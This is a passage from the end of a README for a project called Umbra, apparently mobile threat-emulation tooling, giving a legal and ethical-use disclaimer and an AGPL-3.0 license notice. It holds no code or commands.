- Do **not** install or run Umbra on any device you do not own or lack permission to test. Unauthorized access to a computer or communications device is a crime in most jurisdictions (e.g., the US Computer Fraud and Abuse Act, the UK Computer Misuse Act, and analogous laws worldwide).
- The authors provide this code **for educational and defensive purposes only** — to help researchers and defenders understand mobile threats, test defenses, and build detections.
- By using this software you accept **full legal and ethical responsibility** for your actions. The authors and contributors assume **no liability** for any misuse, damage, or legal consequences arising from the use of this project.
- If you are a defender, use Umbra to validate EDR/MDM detections, test your incident-response playbooks, and harden your fleet — not to target third parties.

---

## License

[AGPL-3.0](LICENSE) — see `LICENSE` and `NOTICE` for details.
